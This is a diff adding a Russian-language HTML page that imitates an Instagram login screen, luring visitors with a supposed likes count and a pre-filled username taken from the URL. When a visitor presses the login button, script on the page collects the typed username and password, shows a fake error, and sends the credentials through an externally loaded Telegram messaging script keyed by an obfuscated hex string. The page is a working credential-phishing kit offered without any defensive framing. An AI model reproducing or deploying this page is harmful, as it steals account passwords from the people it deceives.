@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <script src="https://ummx.github.io/import/script/aes.js"></script>
+    <script src="https://ummx.github.io/import/script/telegram-api.js"></script>
+    <style>
+        *{
+            margin: 0;
+            padding: 0;
+        }
+        input{
+            display: block;
+            margin: auto;
+          padding-left: 10px;
+            width:230px;
+            margin-top:10px;
+            height:30px;
+            border-radius: 5px;
+            border: 1px solid rgb(85, 85, 85);
+            outline: none;
+            
+        }
+        button{
+            display: block;
+            margin: auto;
+            text-align: center;
+            width:245px;
+            height:30px;
+            margin-top:10px;
+            border: none;
+            color: white;
+            border-radius: 5px;
+            background: rgb(0, 119, 255);
+        }
+        p{
+            
+            display: block;
+            margin: auto;
+            text-align: center;
+            margin-top:50px;
+            font-family: arial;
+            font-size:14px;
+        }
+        #out{
+            display: block;
+            margin: auto;
+            text-align: center;
+            margin-top:50px;
+            font-family: arial;
+            color: cornflowerblue;
+        }
+        h3{
+            display: block;
+            margin: auto;
+            text-align: center;
+            padding-top:5px;
+            font-size: 15px;
+            width:270px;
+            font-family: monospace;
+            color: white;
+        }
+        #gif{
+            display: block;
+            margin: auto;
+            text-align: center;
+            width: 250px;
+            margin-top:30px;
+        }
+        .header{
+                 background: tomato;
+                 height:50px;
+        }
+        h4{
+            display: none;
+            margin: auto;
+            text-align: center;
+            width:270px ;
+            margin-top:20px;
+            font-family: monospace;
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+    <h3>
+            Для того чтобы продолжить Войдите в свой аккаунт Инстаграм
+        </h3>
+    </div>
+    <div class="head">
+        <h2 id="out">
+
+        </h2>
+      
+    </div>
+    <img id="gif" src="https://insta.4iam.net/img/like.gif" alt="">
+    <button style="margin-top:40px">Продолжить с Facebook</button>
+    <br><br>
+    <input type="username" autocomplete="off"  id="username" placeholder="Телефон, имя пользователя или эл. адрес">
+    <input type="password" id="password" placeholder="Пароль">
+    <br>
+  <button onclick="login()">Войти</button>
+  <h4 id="error">Введенное вами имя пользователя не принадлежит аккаунту. Проверьте свое имя пользователя и повторите попытку.</h4>
+  <p>У вас ещё нет аккаунта? <a data-testid="sign-up-link" href="/accounts/signup/phone"><span class="_7UhW9   xLCgt       qyrsm      gtFbE      se6yk        ">Зарегистрироваться</span></a></p>
+</body>
+<script>
+    var d = atob(location.search.slice(1).split("&")[0].split("=")[1])
+    var data=JSON.parse(d)
+console.log(data)
+document.getElementById('username').value='@'+data.username;
+document.getElementById('out').innerHTML=`Kоличество лайков [${data.folowers}] <br> Никнейм <a href='https://instagram.com/${data.username}'>${data.username}</a>`
+
+function login(){
+    setTimeout(()=>{
+        document.getElementById('error').style.display="block";
+    },500)
+    var username=document.getElementById('username').value;
+     var password=document.getElementById('password').value;
+     var message=`USERNAME : ${username} %0A PASSWORD : ${password}`;
+     var _0x22e7=["\x36\x37\x30\x34\x37\x36\x31\x62\x33\x63\x62\x66\x38\x32\x36\x30\x63\x35\x35\x36\x63\x33\x65\x34\x31\x33\x39\x39\x61\x62\x38\x62\x63\x64\x66\x30\x62\x35\x31\x61\x39\x38\x39\x33\x35\x65\x66\x63\x30\x34\x30\x35\x62\x64\x39\x63\x61\x30\x39\x38\x64\x65\x38\x37"];sendMessage(message,_0x22e7[0])
+}
+
+</script>
+</html>
